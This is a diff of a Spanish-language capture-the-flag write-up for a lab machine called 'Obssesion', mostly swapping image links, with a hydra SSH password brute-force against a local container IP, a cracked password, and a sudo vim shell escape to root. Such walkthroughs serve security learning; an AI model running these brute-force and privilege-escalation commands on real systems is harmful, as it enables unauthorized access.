@@ -80,9 +80,9 @@ hydra -l nagore -P rockyou.txt -t 16 -W 30 -f  ssh://172.17.0.2
 ```
 ![Descripción de Obssesion](Imagenes/Obssesion_5.png)
 
-Vemos como conseguimos la constraseña de russoski que es "iloveme",por lo tanto ya nos podemos conectar al servicio
+Vemos como conseguimos la constraseña de russoski que es "iloveme",por lo tanto ya nos podemos conectar al servicio SSH:
 
-![alt text](image.png)
+![Descripción de Obssesion](Imagenes/Obssesion_6.png)
 
 
 ## Escalada de privilegios
@@ -92,11 +92,11 @@ Ejecutamos el comando :
 sudo -l
 ```
 
-![alt text](image-1.png)
+![Descripción de Obssesion](Imagenes/Obssesion_7.png)
 
 Vemos que podemos ejecutar como root  el binario vim para ello vamos a GTobins y comprobamos si podemos eplotarlo:
 
 ```ruby
 sudo vim -c ':!/bin/sh'
 ```
-![alt text](image-2.png)
+![Descripción de Obssesion](Imagenes/Obssesion_8.png)
